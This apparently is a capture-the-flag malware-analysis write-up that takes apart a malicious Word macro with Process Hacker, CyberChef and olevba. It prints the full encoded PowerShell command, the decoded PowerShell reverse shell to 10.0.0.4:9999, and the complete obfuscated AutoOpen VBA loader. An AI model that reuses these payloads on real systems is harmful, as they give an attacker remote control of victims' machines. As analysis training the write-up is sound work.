
## Method 1 : 

the first method consists of running the malicious word macro by enabling content and then in processHacker we will search for powershell process invoked and in its properties we will find the command executed

first thing we will just run the macro and see what it does,
let's open the word document and click on options

[![image.png](https://i.postimg.cc/R0YPq2SP/image.png)](https://postimg.cc/QBpgy4W5)

enable content and click on ok to make the macro executes

[![image.png](https://i.postimg.cc/8kMyPyqH/image.png)](https://postimg.cc/8skdZbkJ)

after clicking on ok a powershell command prompt is shown and disappear and this an indicator that a powershell command is spawned.

so let's open process hacker and again run the malicious word document, and after the powershell command prompt disappears let's look for any powershell process in processHacker and we will find one

[![image.png](https://i.postimg.cc/251GpTQn/image.png)](https://postimg.cc/t1HWW3mg)

right click on the powershell and click on properties, and we can see the command line executed

![[Pasted image 20240225205208.png]]

copy everything

```powershell
POWERSHELL.exe -noexit -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgA0ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

we can see that its executing base64 encoded code, let's copy the encoded part and paste in cyberchef

[![image.png](https://i.postimg.cc/GhMvcGhK/image.png)](https://postimg.cc/nCDX2sm9)

the result contains null bytes so let's remove the null bytes 

[![image.png](https://i.postimg.cc/VLHbywDH/image.png)](https://postimg.cc/PPYqZgGm)

and we can see that the code is spawning a reverse shell to the attacker machine at the ip address `10.0.0.4` and the port is `9999`

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.0.0.4",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Method 2 : 

the second method we will open the word document and open the macro vba code and try to reverse it

we can extract the macro code either by using the microsoft word office or using olevba tool in linux

### olevba : 

```bash
remnux@remnux:~/ctf/malware$ olevba Macro_malware_chall.docm 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Macro_malware_chall.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Dim fhegzxpyutslqjvx As String
Dim rkwniobxly As String
Dim qazxswedcfrvgt As String
Dim uyhnbgtvxsz As String

fhegzxpyutslqjvx = ""
rkwniobxly = ""
qazxswedcfrvgt = ""
uyhnbgtvxsz = ""

fhegzxpyutslqjvx = fhegzxpyutslqjvx + odsuozldxufm("4a41426a414777416151426c4147344164414167414430414941424f414755416477417441453841596742714147554159774230414341415577423541484d416441426c414730414c67424f414755")
fhegzxpyutslqjvx = fhegzxpyutslqjvx + odsuozldxufm("416441417541464d416277426a414773415a51423041484d414c67425541454d4155414244414777416151426c414734416441416f414349414d514177414334414d414175414441414c6741304143")
fhegzxpyutslqjvx = fhegzxpyutslqjvx + odsuozldxufm("49414c41413541446b414f51413541436b414f77416b41484d416441427941475541595142744143414150514167414351415977427341476b415a514275414851414c674248414755416441425441")
fhegzxpyutslqjvx = fhegzxpyutslqjvx + odsuozldxufm("4851416367426c414745416251416f41436b414f77426241474941655142304147554157774264414630414a41426941486b416441426c41484d4149414139414341414d414175414334414e674131")
fhegzxpyutslqjvx = fhegzxpyutslqjvx + odsuozldxufm("414455414d774131414877414a51423741444141665141374148634161414270414777415a51416f414367414a41427041434141505141674143514163774230414849415a514268414730414c6742")
rkwniobxly = rkwniobxly + odsuozldxufm("53414755415951426b414367414a41426941486b416441426c41484d414c414167414441414c4141674143514159674235414851415a51427a414334415441426c414734415a774230414767414b51")
rkwniobxly = rkwniobxly + odsuozldxufm("4170414341414c514275414755414941417741436b4165774137414351415a4142684148514159514167414430414941416f414534415a514233414330415477426941476f415a51426a4148514149")
rkwniobxly = rkwniobxly + odsuozldxufm("41417441465141655142774147554154674268414730415a51416741464d416551427a414851415a514274414334415641426c4148674164414175414545415577424441456b415351424641473441")
rkwniobxly = rkwniobxly + odsuozldxufm("597742764147514161514275414763414b514175414563415a51423041464d416441427941476b416267426e414367414a41426941486b416441426c41484d414c414177414377414941416b41476b")
qazxswedcfrvgt = qazxswedcfrvgt + odsuozldxufm("414b514137414351416377426c414734415a41426941474541597742724143414150514167414367416151426c414867414941416b41475141595142304147454149414179414434414a6741784143")
qazxswedcfrvgt = qazxswedcfrvgt + odsuozldxufm("4141664141674145384164514230414330415577423041484941615142754147634149414170414473414a41427a414755416267426b414749415951426a414773414d674167414430414941416b41")
qazxswedcfrvgt = qazxswedcfrvgt + odsuozldxufm("484d415a514275414751415967426841474d4161774167414373414941416941464141557741674143494149414172414341414b414277414863415a41417041433441554142684148514161414167")
qazxswedcfrvgt = qazxswedcfrvgt + odsuozldxufm("41437341494141694144344149414169414473414a41427a414755416267426b41474941655142304147554149414139414341414b414262414851415a514234414851414c67426c41473441597742")
uyhnbgtvxsz = uyhnbgtvxsz + odsuozldxufm("764147514161514275414763415851413641446f415151425441454d415351424a41436b414c674248414755416441424341486b416441426c41484d414b41416b41484d415a514275414751415967")
uyhnbgtvxsz = uyhnbgtvxsz + odsuozldxufm("426841474d416177417941436b414f77416b41484d41644142794147554159514274414334415677427941476b416441426c414367414a41427a414755416267426b4147494165514230414755414c")
uyhnbgtvxsz = uyhnbgtvxsz + odsuozldxufm("414177414377414a41427a414755416267426b4147494165514230414755414c67424d414755416267426e4148514161414170414473414a41427a414851416367426c414745416251417541455941")
uyhnbgtvxsz = uyhnbgtvxsz + odsuozldxufm("6241423141484d416141416f41436b4166514137414351415977427341476b415a514275414851414c674244414777416277427a414755414b41417041413d3d")

x = Shell(odsuozldxufm("504f574552") & odsuozldxufm("5348454c4c") & odsuozldxufm("2e657865") & odsuozldxufm("202d6e6f65786974202d772068696464") & odsuozldxufm("656e202d656e6320") & fhegzxpyutslqjvx & rkwniobxly & qazxswedcfrvgt & uyhnbgtvxsz, 1)

End Sub

Private Function odsuozldxufm(ByVal gwndcowqyulk As String) As String
Dim cjzkqjwvtdxr As Long
For cjzkqjwvtdxr = 1 To Len(gwndcowqyulk) Step 2
odsuozldxufm = odsuozldxufm & Chr$(Val("&H" & Mid$(gwndcowqyulk, cjzkqjwvtdxr, 2)))
Next cjzkqjwvtdxr
End Function
```

